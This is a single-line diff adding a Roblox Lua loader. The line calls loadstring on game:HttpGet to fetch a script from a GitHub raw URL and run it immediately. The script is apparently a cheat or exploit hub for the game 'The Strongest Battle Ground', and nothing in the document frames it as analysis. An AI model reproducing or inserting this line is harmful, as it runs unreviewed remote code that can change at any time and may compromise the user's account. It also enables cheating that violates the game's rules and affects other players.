@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CurseOfDarkness/CurseHubTSBG/main/The%20Strongest%20Battle%20Ground"))()
